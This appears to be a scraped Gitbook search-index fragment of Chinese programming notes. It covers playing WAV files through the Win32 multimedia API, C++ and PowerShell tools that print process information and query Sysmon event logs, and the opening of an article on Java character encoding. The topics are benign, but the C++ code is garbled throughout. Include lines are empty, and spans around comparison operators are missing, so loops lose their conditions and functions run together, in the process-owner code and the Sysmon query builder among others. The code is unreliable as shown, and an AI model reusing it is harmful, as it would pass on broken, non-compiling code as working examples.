hSndResource=FindResource(hmod,MAKEINTRESOURCE(IDR_WAVE1),_T(\"WAVE\")); // ③ 装载资源数据并加锁： HGLOBAL hGlobalMem=LoadResource(hmod,hSndResource); LPCTSTR lpMemSound=(LPCSTR)LockResource(hGlobalMem); // ④ 播放声音文件： sndPlaySound(lpMemSound,SND_MEMORY))； // ⑤ 释放资源句柄： FreeResource(hGlobalMem); 播放声音文件的高级方法 在C++中提供了一组对音频设备及多媒体文件直接进行操作的函数。利用这些函数可以灵活地对声音文件进行各种处理。 首先介绍几个要用到的数据结构： WAVEFORMATEX结构： 定义了WAVE音频数据文件的格式 WAVEHDR结构： 定义了波形音频缓冲区，读出的数据首先要填充此缓冲区才能送音频设备播放 WAVEOUTCAPS结构： 描述了音频设备的性能 MMCKINFO结构： 包含了RIFF文件中一个块的信息 下面给出框架源码，在C++环境下可直接套用： LPSTR szFileName; // 声音文件名 MMCKINFO mmckinfoParent; MMCKINFO mmckinfoSubChunk; DWORD dwFmtSize; HMMIO m_hmmio; // 音频文件句柄 DWORD m_WaveLong; HPSTR lpData; // 音频数据 HANDLE m_hData; HANDLE m_hFormat; WAVEFORMATEX * lpFormat; DWORD m_dwDataOffset; DWORD m_dwDataSize; WAVEHDR pWaveOutHdr; WAVEOUTCAPS pwoc; HWAVEOUT hWaveOut; // 打开波形文件 if(!(m_hmmio=mmioOpen(szFileName,NULL,MMIO_READ|MMIO_ALLOCBUF))) { Error(\"Failed to open the file.\"); // 错误处理函数 return false; } // 检查打开文件是否是声音文件 mmckinfoParent.fccType =mmioFOURCC(’W’,’A’,’V’,’E’); if(mmioDescend(m_hmmio,(LPMMCKINFO)&mmckinfoParent,NULL,MMIO_FINDRIFF)) { // NOT WAVE FILE AND QUIT } // 寻找 fmt 块 mmckinfoSubChunk.ckid =mmioFOURCC(’f’,’m’,’t’,’ ’); if(mmioDescend(m_hmmio,&mmckinfoSubChunk,&mmckinfoParent,MMIO_FINDCHUNK)) { // Can't find 'fmt' chunk } // 获得 fmt 块的大小，申请内存 dwFmtSize=mmckinfoSubChunk.cksize ; m_hFormat=LocalAlloc(LMEM_MOVEABLE,LOWORD(dwFmtSize)); if(!m_hFormat) { // failed alloc memory } lpFormat=(WAVEFORMATEX*)LocalLock(m_hFormat); if(!lpFormat) { // failed to lock the memory } if((unsigned long)mmioRead(m_hmmio,(HPSTR)lpFormat,dwFmtSize)!=dwFmtSize) { // failed to read format chunk } // 离开 fmt 块 mmioAscend(m_hmmio,&mmckinfoSubChunk,0); //寻找 data块 mmckinfoSubChunk.ckid=mmioFOURCC(’d’,’a’,’t’,’a’); if(mmioDescend(m_hmmio,&mmckinfoSubChunk,&mmckinfoParent,MMIO_FINDCHUNK)) { // Can't find 'data' chunk } // 获得 data块的大小 m_dwDataSize=mmckinfoSubChunk.cksize ; m_dwDataOffset =mmckinfoSubChunk.dwDataOffset ; if(m_dwDataSize==0L) { // no data in the 'data' chunk } // 为音频数据分配内存 lpData=new char[m_dwDataSize]; if(!lpData) { // faile } if(mmioSeek(m_hmmio,SoundOffset,SEEK_SET) 注意： 以上使用的音频设备和声音文件操作函数的声明包含在头文件中。 在编译时要加入动态连接导入库winmm.lib，在VC++6.0中的具体实现方法是：在Developer Studio的Project菜单中，选择Settings，然后在Link选项卡上的Object/Library Modules控制中加入winmm.lib。 在pWaveOutHdr.lpData中指定不同的数据，可以播放音频数据文件中任意指定位置的声音。 以上程序在VC++6.0中调试通过，在文中省略了对错误及异常情况的处理，在实际应用中必须加入。 结论 在C++中可以根据应用需要采用不同的方法播放声音文件： 简单应用可以直接调用第一种方法的声音播放函数。 若希望隐藏声音文件、或减少最终可执行文件的关联文件数，可使用第二种方法。 如果在播放之前要对声音数据进行处理，可使用第三种方法。 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/GetProcInfo.html":{"url":"markdown/notes/language/c/GetProcInfo.html","title":"获取进程信息","keywords":"","body":"获取进程信息相关资源C++ 源码PowserShell 源码获取进程信息 相关资源 PROCESSENTRY32 结构： https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32 MODULEENTRY32 结构： https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32 get_process.exe 下载 C++ 源码 /*************************************************************************************** * get_process.cpp * * 进程信息查询脚本，使用方法: * ./get_process.exe : 查询当前所有进程信息 * ./get_process.exe -id 1234 : 查询进程号为 1234 的进程信息 * ./get_process.exe -name abcd : 查询进程名以 abcd 开头（忽略大小写）的进程信息 * ***************************************************************************************/ #include #include #include #include /* 进程信息结构体: https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32 typedef struct tagPROCESSENTRY32 { 　　DWORD dwSize; // 此进程的结构体大小（字节） 　　DWORD cntUsage; // 进程的引用计数（已废弃，固定值0） 　　DWORD th32ProcessID; // 进程号 　　ULONG_PTR th32DefaultHeapID; // 默认堆ID（已废弃，固定值0） 　　DWORD th32ModuleID; // 进程模块ID（已废弃，固定值0） 　　DWORD cntThreads; // 此进程创建的线程数 　　DWORD th32ParentProcessID; // 父进程号 　　LONG pcPriClassBase; // 此进程所创建的线程优先级 　　DWORD dwFlags; // （已废弃，固定值0） 　　TCHAR szExeFile[MAX_PATH]; // 进程的可执行文件的名称（不含路径，完整路径可通过 MODULEENTRY32->szExePath 获取） } PROCESSENTRY32, *PPROCESSENTRY32; */ /* 进程模块结构体: https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-moduleentry32 typedef struct tagMODULEENTRY32 { DWORD dwSize; // 此模块的结构体大小（字节） DWORD th32ModuleID; // 模块ID（已废弃，固定值1） DWORD th32ProcessID; // 所属进程的进程号 DWORD GlblcntUsage; // 负载计数（通常没有意义，一般情况下值为 0xFFFF） DWORD ProccntUsage; // 与 GlblcntUsage 相同 BYTE *modBaseAddr; // 该模块在所属进程中的基址 DWORD modBaseSize; // 模块大小（字节） HMODULE hModule; // 该模块在所属进程中的句柄 char szModule[MAX_MODULE_NAME32 + 1]; // 模块名称 char szExePath[MAX_PATH]; // 模块路径 } MODULEENTRY32; */ void printSysError(); // 打印系统异常 void printProc(PROCESSENTRY32 pe32); // 打印进程信息到控制台 char* getProcessOwner(DWORD pid); // 获取进程归属用户 bool equal(const char* a, const char* b); // 比较两个字符串是否相同（忽略大小写） char* toChar(const wchar_t* _wchar); // 宽字符 -> ASCII字符 bool startwith(const char* str, const char* substr); // 判断 str 是否以 substr 开头（忽略大小写） /** * argc: 入参个数(至少为1: 第0个为执行文件文件名) * argv: 入参列表。当 argc!=3 时打印所有进程; 当 argc==3 时: * -id {pid} : 打印进程号为 pid 的进程信息 * -name {pname} : 打印进程名为以 pname 开头的进程信息（忽略大小写，若有多个则只打印第一个） */ int main(int argc, char* argv[]) { // 提取入参 int exPid = -1; // 期望查询的进程号 char* exPname = \"\"; // 期望查询的进程名 if(argc == 3) { if(equal(argv[1], \"-id\")) { exPid = atoi(argv[2]); } else if(equal(argv[1], \"-name\")) { exPname = argv[2]; } } // 拍摄当前系统所有进程快照 HANDLE hProcess = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if(hProcess == INVALID_HANDLE_VALUE) { printf(\"[Error] Fail to take processes snapshot.\\n\"); printSysError(); return -1; } PROCESSENTRY32 pe32; pe32.dwSize = sizeof(pe32); BOOL hasNext = ::Process32First(hProcess, &pe32); // 进程快照列表迭代器 // 打印特定进程信息 if(exPid > -1 || strlen(exPname) > 0) { bool flag = false; while(hasNext) { DWORD pid = pe32.th32ProcessID; char* pname = toChar(pe32.szExeFile); if(((DWORD) exPid) == pid || startwith(pname, exPname)) { printProc(pe32); flag = true; break; } delete[] pname; hasNext = ::Process32Next(hProcess, &pe32); } if(flag == false) { printf(\"[Error] The process is not exists.\\n\"); } // 打印所有进程信息 } else { while(hasNext) { printProc(pe32); hasNext = ::Process32Next(hProcess, &pe32); } } // 清除快照对象 ::CloseHandle(hProcess); // system(\"pause\"); return 0; } // 打印系统异常 void printSysError() { DWORD errId; TCHAR errMsg[256]; TCHAR* p; errId = GetLastError(); FormatMessage(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, errId, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), errMsg, 256, NULL); p = errMsg; while(*p > 31 || *p == 9) { ++p; } do { *p-- = 0; } while(p >= errMsg && (*p == '.' || *p User.Sid, szUserName, &dwNameSize, szDomain, &dwDomainSize, &SNU) != 0) { sprintf(owner, \"%s\\\\%s\\0\", toChar(szDomain), toChar(szUserName)); } } __finally { if(pTokenUser != NULL) { free(pTokenUser); } } return owner; } // 比较两个字符串是否相同（忽略大小写） bool equal(const char* a, const char* b) { bool flag = false; if(a == NULL && b == NULL) { flag = true; } else if(a != NULL && b != NULL) { flag = (stricmp(a, b) == 0); } return flag; } // 宽字符 -> ASCII字符 char* toChar(const wchar_t* _wchar) { int len = WideCharToMultiByte(CP_ACP, 0, _wchar, -1, NULL, 0, NULL, NULL); char* _char = new char[len]; WideCharToMultiByte(CP_ACP, 0, _wchar, -1, _char, len, NULL, NULL); return _char; } // 判断 str 是否以 substr 开头（忽略大小写） bool startwith(const char* str, const char* substr) { bool flag = false; if(str != NULL && substr != NULL) { int len = strlen(substr); if(len > 0) { flag = (strnicmp(str, substr, len) == 0); } } return flag; } PowserShell 源码 # get_process.ps1 # # 进程信息查询脚本 # Powershell Script 3.0+ # --------------------------------------------------------------------------------------- # 脚本使用方式: # # 通过进程号查询: # .\\get_process.ps1 -id 0 # # 通过进程名查询: # .\\get_process.ps1 -name \"powershell\" # # --------------------------------------------------------------------------------------- # id: 进程ID（二选一） # name: 进程名称（二选一） param([int]$id=-1, [string]$name=\"\") # 获取进程对象 function Get-Proc { param([int]$id=-1, [string]$name=\"\") Try { if ($id -gt -1) { $process = Get-Process -Id $id -ErrorAction Stop } else { $process = Get-Process -Name $name -ErrorAction Stop } } catch [Microsoft.PowerShell.Commands.ProcessCommandException] { Write-Warning \"Process [id=$id][name=$name] has not exist\" } catch { Write-Warning \"Find Process[id=$id][name=$name] Error\" } return $process } # 获取进程属主 function Get-Proc-Owner { param([int]$id=-1) $owner = \"\" Try { $info = (Get-WmiObject -Class Win32_Process -Filter \"Handle=$id\").GetOwner() if ($info.ReturnValue -eq 2) { $owner = 'Unknow/Unknow' } else { $owner = '{0}/{1}' -f $info.Domain, $info.User } } catch { Write-Warning \"Find Process[id=$id]'s owner Error\" } return $owner } $process = Get-Proc -id $id -name $name if($process) { $owner = Get-Proc-Owner -id $id $process_inst = Get-CimInstance Win32_Process -Filter \"ProcessId = '$id'\" $fid = $process_inst.ParentProcessId Write-Host \"---------------------------------------\" Write-Host \"PID =\" $process.Id Write-Host \"PPID =\" $fid Write-Host \"Name(ProcessName) =\" $process.Name Write-Host \"Path =\" $process.Path Write-Host \"Owner =\" $owner Write-Host \"Handle =\" $process.Handle Write-Host \"Handles(Handlecount) =\" $process.Handles Write-Host \"NPM(NonpagedSystemMemorySize) =\" $process.NPM Write-Host \"PM(PagedMemorySize) =\" $process.PM Write-Host \"VM(VirtualMemorySize) =\" $process.VM Write-Host \"WS(WorkingSet) =\" $process.WS Write-Host \"BasePriority =\" $process.BasePriority Write-Host \"Container =\" $process.Container Write-Host \"EnableRaisingEvents =\" $process.EnableRaisingEvents Write-Host \"ExitCode =\" $process.ExitCode Write-Host \"ExitTime =\" $process.ExitTime Write-Host \"HasExited =\" $process.HasExited Write-Host \"MachineName =\" $process.MachineName Write-Host \"MainModule =\" $process.MainModule Write-Host \"MainWindowHandle =\" $process.MainWindowHandle Write-Host \"MainWindowTitle =\" $process.MainWindowTitle Write-Host \"MaxWorkingSet =\" $process.MaxWorkingSet Write-Host \"MinWorkingSet =\" $process.MinWorkingSet # Write-Host \"Modules =\" $process.Modules Write-Host \"NonpagedSystemMemorySize =\" $process.NonpagedSystemMemorySize Write-Host \"NonpagedSystemMemorySize64 =\" $process.NonpagedSystemMemorySize64 Write-Host \"NonPagedMemorySize =\" $process.NonPagedMemorySize Write-Host \"PagedMemorySize64 =\" $process.PagedMemorySize64 Write-Host \"PagedSystemMemorySize =\" $process.PagedSystemMemorySize Write-Host \"PagedSystemMemorySize64 =\" $process.PagedSystemMemorySize64 Write-Host \"PeakPagedMemorySize =\" $process.PeakPagedMemorySize Write-Host \"PeakPagedMemorySize64 =\" $process.PeakPagedMemorySize64 Write-Host \"PeakVirtualMemorySize =\" $process.PeakVirtualMemorySize Write-Host \"PeakVirtualMemorySize64 =\" $process.PeakVirtualMemorySize64 Write-Host \"PeakWorkingSet =\" $process.PeakWorkingSet Write-Host \"PeakWorkingSet64 =\" $process.PeakWorkingSet64 Write-Host \"PriorityBoostEnabled =\" $process.PriorityBoostEnabled Write-Host \"PriorityClass =\" $process.PriorityClass Write-Host \"PrivateMemorySize =\" $process.PrivateMemorySize Write-Host \"PrivateMemorySize64 =\" $process.PrivateMemorySize64 Write-Host \"PrivilegedProcessorTime =\" $process.PrivilegedProcessorTime Write-Host \"ProcessorAffinity =\" $process.ProcessorAffinity Write-Host \"Responding =\" $process.Responding Write-Host \"SessionId =\" $process.SessionId Write-Host \"Site =\" $process.Site Write-Host \"StandardError =\" $process.StandardError Write-Host \"StandardInput =\" $process.StandardInput Write-Host \"StandardOutput =\" $process.StandardOutput Write-Host \"StartInfo =\" $process.StartInfo Write-Host \"StartTime =\" $process.StartTime Write-Host \"SynchronizingObject =\" $process.SynchronizingObject # Write-Host \"Threads =\" $process.Threads Write-Host \"Threads.Count =\" $process.Threads.Count Write-Host \"TotalProcessorTime =\" $process.TotalProcessorTime Write-Host \"UserProcessorTime =\" $process.UserProcessorTime Write-Host \"VirtualMemorySize64 =\" $process.VirtualMemorySize64 Write-Host \"WorkingSet =\" $process.WorkingSet Write-Host \"WorkingSet64 =\" $process.WorkingSet64 Write-Host \"Company =\" $process.Company Write-Host \"CPU =\" $process.CPU Write-Host \"Description =\" $process.Description Write-Host \"FileVersion =\" $process.FileVersion Write-Host \"Product =\" $process.Product Write-Host \"ProductVersion =\" $process.ProductVersion # Write-Host \"PSConfiguration =\" $process.PSConfiguration # Write-Host \"PSResources =\" $process.PSResources } # --------------------------------------------------------------------------------------- # 通过 Get-Member 命令可以获得 process 对象的所有属性 # # TypeName: System.Diagnostics.Process # # Name MemberType Definition # ---- ---------- ---------- # Handles AliasProperty Handles = Handlecount # Name AliasProperty Name = ProcessName # NPM AliasProperty NPM = NonpagedSystemMemorySize # PM AliasProperty PM = PagedMemorySize # VM AliasProperty VM = VirtualMemorySize # WS AliasProperty WS = WorkingSet # Disposed Event System.EventHandler Disposed(System.Object, System.EventArgs) # ErrorDataReceived Event System.Diagnostics.DataReceivedEventHandler ErrorDataReceived(System.Objec... # Exited Event System.EventHandler Exited(System.Object, System.EventArgs) # OutputDataReceived Event System.Diagnostics.DataReceivedEventHandler OutputDataReceived(System.Obje... # BeginErrorReadLine Method void BeginErrorReadLine() # BeginOutputReadLine Method void BeginOutputReadLine() # CancelErrorRead Method void CancelErrorRead() # CancelOutputRead Method void CancelOutputRead() # Close Method void Close() # CloseMainWindow Method bool CloseMainWindow() # CreateObjRef Method System.Runtime.Remoting.ObjRef CreateObjRef(type requestedType) # Dispose Method void Dispose(), void IDisposable.Dispose() # Equals Method bool Equals(System.Object obj) # GetHashCode Method int GetHashCode() # GetLifetimeService Method System.Object GetLifetimeService() # GetType Method type GetType() # InitializeLifetimeService Method System.Object InitializeLifetimeService() # Kill Method void Kill() # Refresh Method void Refresh() # Start Method bool Start() # ToString Method string ToString() # WaitForExit Method bool WaitForExit(int milliseconds), void WaitForExit() # WaitForInputIdle Method bool WaitForInputIdle(int milliseconds), bool WaitForInputIdle() # __NounName NoteProperty System.String __NounName=Process # BasePriority Property int BasePriority {get;} # Container Property System.ComponentModel.IContainer Container {get;} # EnableRaisingEvents Property bool EnableRaisingEvents {get;set;} # ExitCode Property int ExitCode {get;} # ExitTime Property datetime ExitTime {get;} # Handle Property System.IntPtr Handle {get;} # HandleCount Property int HandleCount {get;} # HasExited Property bool HasExited {get;} # Id Property int Id {get;} # MachineName Property string MachineName {get;} # MainModule Property System.Diagnostics.ProcessModule MainModule {get;} # MainWindowHandle Property System.IntPtr MainWindowHandle {get;} # MainWindowTitle Property string MainWindowTitle {get;} # MaxWorkingSet Property System.IntPtr MaxWorkingSet {get;set;} # MinWorkingSet Property System.IntPtr MinWorkingSet {get;set;} # Modules Property System.Diagnostics.ProcessModuleCollection Modules {get;} # NonpagedSystemMemorySize Property int NonpagedSystemMemorySize {get;} # NonpagedSystemMemorySize64 Property long NonpagedSystemMemorySize64 {get;} # PagedMemorySize Property int PagedMemorySize {get;} # PagedMemorySize64 Property long PagedMemorySize64 {get;} # PagedSystemMemorySize Property int PagedSystemMemorySize {get;} # PagedSystemMemorySize64 Property long PagedSystemMemorySize64 {get;} # PeakPagedMemorySize Property int PeakPagedMemorySize {get;} # PeakPagedMemorySize64 Property long PeakPagedMemorySize64 {get;} # PeakVirtualMemorySize Property int PeakVirtualMemorySize {get;} # PeakVirtualMemorySize64 Property long PeakVirtualMemorySize64 {get;} # PeakWorkingSet Property int PeakWorkingSet {get;} # PeakWorkingSet64 Property long PeakWorkingSet64 {get;} # PriorityBoostEnabled Property bool PriorityBoostEnabled {get;set;} # PriorityClass Property System.Diagnostics.ProcessPriorityClass PriorityClass {get;set;} # PrivateMemorySize Property int PrivateMemorySize {get;} # PrivateMemorySize64 Property long PrivateMemorySize64 {get;} # PrivilegedProcessorTime Property timespan PrivilegedProcessorTime {get;} # ProcessName Property string ProcessName {get;} # ProcessorAffinity Property System.IntPtr ProcessorAffinity {get;set;} # Responding Property bool Responding {get;} # SessionId Property int SessionId {get;} # Site Property System.ComponentModel.ISite Site {get;set;} # StandardError Property System.IO.StreamReader StandardError {get;} # StandardInput Property System.IO.StreamWriter StandardInput {get;} # StandardOutput Property System.IO.StreamReader StandardOutput {get;} # StartInfo Property System.Diagnostics.ProcessStartInfo StartInfo {get;set;} # StartTime Property datetime StartTime {get;} # SynchronizingObject Property System.ComponentModel.ISynchronizeInvoke SynchronizingObject {get;set;} # Threads Property System.Diagnostics.ProcessThreadCollection Threads {get;} # TotalProcessorTime Property timespan TotalProcessorTime {get;} # UserProcessorTime Property timespan UserProcessorTime {get;} # VirtualMemorySize Property int VirtualMemorySize {get;} # VirtualMemorySize64 Property long VirtualMemorySize64 {get;} # WorkingSet Property int WorkingSet {get;} # WorkingSet64 Property long WorkingSet64 {get;} # PSConfiguration PropertySet PSConfiguration {Name, Id, PriorityClass, FileVersion} # PSResources PropertySet PSResources {Name, Id, Handlecount, WorkingSet, NonPagedMemorySize, PagedM... # Company ScriptProperty System.Object Company {get=$this.Mainmodule.FileVersionInfo.CompanyName;} # CPU ScriptProperty System.Object CPU {get=$this.TotalProcessorTime.TotalSeconds;} # Description ScriptProperty System.Object Description {get=$this.Mainmodule.FileVersionInfo.FileDescri... # FileVersion ScriptProperty System.Object FileVersion {get=$this.Mainmodule.FileVersionInfo.FileVersion;} # Path ScriptProperty System.Object Path {get=$this.Mainmodule.FileName;} # Product ScriptProperty System.Object Product {get=$this.Mainmodule.FileVersionInfo.ProductName;} # ProductVersion ScriptProperty System.Object ProductVersion {get=$this.Mainmodule.FileVersionInfo.Product... Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/c/GetSysmon.html":{"url":"markdown/notes/language/c/GetSysmon.html","title":"获取 Sysmon 事件信息","keywords":"","body":"获取 Sysmon 事件信息相关资源C++ 源码PowerShell 源码获取 Sysmon 事件信息 相关资源 Sysmon 官方文档： https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon get_sysmon_event.exe 下载 C++ 源码 /************************************************************************************************************* * get_sysmon_event.cpp * * Sysmon 事件查询脚本，使用方法: * ./get_sysmon_event.exe * -limit 100 : 一次查询的数量上限（可选，默认值100） * -id 1 : 事件类型（可选，默认值1） * -ts '2019-12-16T00:00:00.000000000Z' : 查询开始时间（可选，默认无此条件） * -te '2019-12-16T08:00:00.000000000Z' : 查询结束时间（可选，默认值为当前时间） * * ./get_sysmon_event.exe * -limit 100 : 一次查询的数量上限（可选，默认值100） * -query str : 查询字符串，语法形式形如： * \"Event/System[TimeCreated[@SystemTime'2019-12-05T00:00:00.000000000Z'] and EventID=3]\" * *************************************************************************************************************/ #include #include #include #include #include #pragma comment(lib, \"wevtapi.lib\") // winevt.h 库文件 #define EVENTID_PROCESS_CREATE 1 // Sysmon事件ID: 进程创建 #define EVENTID_NETWORK_CONNECT 3 // Sysmon事件ID: 网络连接 #define EVENT_CHANNEL L\"Microsoft-Windows-Sysmon/Operational\" // Sysmon事件管道名称 #define EVENT_QUERY L\"Event/System[EventID=1]\" // 系统事件查询条件语句 #define EVENT_ITERATOR 10 // 单次迭代事件的个数 #define EVENT_LIMIT 50 // 默认查询返回的事件数量上限 static DWORD _evtLimit = (DWORD) EVENT_LIMIT; // 当前查询返回的事件数量上限 bool isEmpty(const char* str); // 检测字符串是否为空 bool equal(const char* a, const char* b); // 比较两个字符串是否相同（忽略大小写） LPWSTR toLPWSTR(const char* str); // ASCII字符 -> 宽字符 void delUnASCII(LPWSTR wstr); // 把非 ASCII 字符替换成 ? LPWSTR toEvtQuery(int argc, char* argv[]); // 根据脚本入参生成系统事件查询条件语句 LPWSTR toEvtQuery(int eventId, const char* startTime, const char* endTime); // 生成系统事件查询条件语句 DWORD printEvents(EVT_HANDLE hEvents, DWORD limit); // 打印查询得到的系统事件列表 DWORD printEvent(EVT_HANDLE hEvent); // 打印单个系统事件 int main(int argc, char* argv[]) { LPWSTR channel = EVENT_CHANNEL; LPWSTR evtQuery = toEvtQuery(argc, argv); EVT_HANDLE hEvents = EvtQuery(NULL, channel, evtQuery, EvtQueryChannelPath | EvtQueryReverseDirection); if(NULL == hEvents) { DWORD errId = GetLastError(); if (ERROR_EVT_CHANNEL_NOT_FOUND == errId) { wprintf(L\"[Error %lu] The channel was not found: %s\\n\", errId, channel); } else if (ERROR_EVT_INVALID_QUERY == errId) { wprintf(L\"[Error %lu] The query is invalid: %s\\n\", errId, evtQuery); } else { wprintf(L\"[Error %lu] EvtQuery failed.\\n\", errId); } } else { printEvents(hEvents, _evtLimit); EvtClose(hEvents); } // system(\"pause\"); return 0; } // 根据脚本入参生成系统事件查询条件语句 LPWSTR toEvtQuery(int argc, char* argv[]) { int eventId = EVENTID_PROCESS_CREATE; char* startTime = \"\"; char* endTime = \"\"; char* query = \"\"; for(int i = 1; i 0 ? toLPWSTR(query) : toEvtQuery(eventId, startTime, endTime)); } // 生成系统事件查询条件语句 LPWSTR toEvtQuery(int eventId, const char* startTime, const char* endTime) { char* evtQuery = NULL; if(isEmpty(startTime) && isEmpty(endTime)) { evtQuery = new char[26]; sprintf(evtQuery, \"Event/System[EventID=%d]\\0\", eventId); } else if(!isEmpty(startTime) && !isEmpty(endTime)) { evtQuery = new char[26 + 62 * 2]; sprintf(evtQuery, \"Event/System[EventID=%d and TimeCreated[@SystemTime>'%s'] and TimeCreated[@SystemTime'%s']]\\0\", eventId, startTime); } else if(!isEmpty(endTime)) { evtQuery = new char[26 + 62]; sprintf(evtQuery, \"Event/System[EventID=%d and TimeCreated[@SystemTime 1 5 4 1 0 0x8000000000000000 50077 Microsoft-Windows-Sysmon/Operational WIN-S1B6IAK3UN2 2019-12-17 10:26:56.242 {68E7DA22-AD70-5DF8-0000-0010428D1D01} 16256 C:\\\\Program Files\\\\Sublime Text 3\\\\sublime_text.exe 3188 Sublime Text Sublime Text Sublime HQ Pty Ltd sublime_text.exe \"/C/Program Files/Sublime Text 3/sublime_text.exe\" \"--crawl\" \"14516:crawl:11\" C:\\\\Program Files\\\\Sublime Text 3\\\\ WIN-S1B6IAK3UN2\\\\Administrator {68E7DA22-383A-5DF8-0000-0020CBFF0200} 0x2ffcb 2 High SHA256=450AD9A507403C5A3BA42DC6E1910E84E886200AFD190BF4B0B5B95FC066F7E1 {68E7DA22-A908-5DF8-0000-0010A0B40F01} 14516 C:\\\\Program Files\\\\Sublime Text 3\\\\sublime_text.exe \"C:\\\\Program Files\\\\Sublime Text 3\\\\sublime_text.exe\" */ DWORD printEvent(EVT_HANDLE hEvent) { DWORD errId = ERROR_SUCCESS; DWORD dwBufferSize = 0; DWORD dwBufferUsed = 0; DWORD dwPropertyCount = 0; LPWSTR pRenderedContent = NULL; if (!EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferSize, pRenderedContent, &dwBufferUsed, &dwPropertyCount)) { errId = GetLastError(); if(errId == ERROR_INSUFFICIENT_BUFFER) { dwBufferSize = dwBufferUsed; pRenderedContent = (LPWSTR) malloc(dwBufferSize); if(pRenderedContent) { EvtRender(NULL, hEvent, EvtRenderEventXml, dwBufferSize, pRenderedContent, &dwBufferUsed, &dwPropertyCount); } else { wprintf(L\"[Error %lu] malloc failed.\\n\", errId); errId = ERROR_OUTOFMEMORY; } } else if(errId != ERROR_SUCCESS) { wprintf(L\"[Error %lu] EvtRender failed.\\n\", errId); } } if(pRenderedContent) { delUnASCII(pRenderedContent); wprintf(L\"%ls\\n\", pRenderedContent); wprintf(L\"==================\\n\"); free(pRenderedContent); errId = ERROR_SUCCESS; } return errId; } // 检测字符串是否为空 bool isEmpty(const char* str) { return (str == NULL || strlen(str) 宽字符 LPWSTR toLPWSTR(const char* str) { int dwLen = strlen(str) + 1; int nwLen = MultiByteToWideChar(CP_ACP, 0, str, dwLen, NULL, 0); LPWSTR lpwstr = new WCHAR[dwLen]; MultiByteToWideChar(CP_ACP, 0, str, dwLen, lpwstr, nwLen); return lpwstr; } // 把非 ASCII 字符替换成 ? void delUnASCII(LPWSTR wstr) { wchar_t* p = wstr; while(*p) { if(((int) *p) > 127) { *p = '?'; } p++; } } PowerShell 源码 # get_sysmon_event.ps1 # # sysmon事件查询脚本 # Powershell Script 3.0+ # --------------------------------------------------------------------------------------- # 脚本使用方式: # # .\\get_sysmon_event.ps1 -id 1 -limit 10 -h 0 -m -5 -s 0 # # --------------------------------------------------------------------------------------- # id: sysmon事件ID （默认值1） # 1 Process Creation # 2 Process Changed a File Creation Time # 3 Network Connection # 4 Sysmon Service State Changed # 5 Process Terminated # 6 Driver Loaded # 7 Image Loaded # 8 Create Remote Thread # 9 Raw Access Read # 10 Process Access # 11 File Create # 12 Registry Event (Object Create and Delete) # 13 Registry Event (Value Set) # 14 Registry Event (Key and Value Rename) # 15 File Create Stream Hash # 16 Sysmon Configuration Change # 17 Named Pipe Created # 18 Named Pipe Connected # 255 Error # limit: 限制单次查询最多获取的事件数 （默认值100） # h: Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/java/":{"url":"markdown/notes/language/java/","title":"Java","keywords":"","body":"JAVAJAVA Java 的编转码浅析 Java 性能调优：如何有效率地追求女神？ Logback 动态日志配置教程 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/notes/language/java/Java的编转码浅析.html":{"url":"markdown/notes/language/java/Java的编转码浅析.html","title":"Java 的编转码浅析","keywords":"","body":"Java的编转码浅析■ 字符集与编码■ 字符集类型■ 范围与兼容■ 编码的转换■ Java的编转码■ 负负不得正■ 诡异的 ISO-8859-1■ 协议欺骗Java的编转码浅析 最近工作的时候，频繁遇到乱码的问题。究其原因，一般都是因为对字符集编码不熟悉，使用了错误的方法进行编码转换，从而导致乱码。 为此我特意通过实践，以Java语言为基准整理了一些编码和转码的基本知识，希望能够有深入浅出之效，帮助大家在工作中更好地处理编码问题。 ■ 字符集与编码 字符集就是多个符号的集合，如英文字符集、中文字符集、数字集、拉丁符号集等。在一个字符集中，用于唯一标识某个字符的号码，即为编码。在计算机中，编码是由01二进制串组成的，而不同的字符集，编码长度为单字节到多字节不等。 通常会用字典去记录字符集中各个字符与编码的对应关系，亦即是编码表。 ■ 字符集类型 常用的字符集有 ISO-8859-1、 GBK、 UTF-8、 Unicode 等。 ISO-8859-1 是在 ASCII 的扩展编码，是单字节定长编码，仅能表示英文字符。 GBK 是中国的国标码，是不定长编码，除了兼容 ISO-8859-1 编码，还支持简繁中文、平假片假日文字符的表示。 UTF-8 和 Unicode 编码都是不定长编码，虽然两者都能够表示世界上所有符号，但 UTF-8 至少兼容了 ISO-8859-1 编码， Unicode 却不兼容其他所有编码。 ■ 范围与兼容 不同的字符集有其表示范围，如 ISO-8859-1 只可以表示英文字符、 GBK 只可以表示英文、中文和日文字符。 至于兼容，如字符集A兼容字符集B，除了指字符集A的表示范围囊括了字符集B，还指字符集B中的所有字符的编码值与字符集A中对应的字符一致。 如 GBK、 UTF-8 均兼容 ISO-8859-1 ，以英文字符 a 为例，其在 ISO-8859-1 、 GBK 和 UTF-8 中都是单字节的编码值 0x61；而 Unicode 不兼容 ISO-8859-1 ，事实上英文字符a在 Unicode 中是一个双字节的编码值 0x00 0x61。 ■ 编码的转换 编码兼容与编码转换没有必然联系，表示范围才是编码转换的根本。 两个字符集之间可以进行编码转换，而不出现乱码，其前提是它们的表示范围相同。如 UTF-8 和 Unicode ，它们的全部字符都可以实现可逆互转。 对于表示范围不同的两个字符集，只可以从小范围字符集转换到大范围字符集，而不能逆向转换，除非对大范围字符集进行范围限制。如 GBK 和 UTF-8 ，从 GBK 转换到 UTF-8 一定不会出现乱码；但从 UTF-8 转换到 GBK 则需要把转换范围限制在英文、中文和日文字符，若转换其他字符（如韩文）则必定乱码。 ■ Java的编转码 Java 的 String 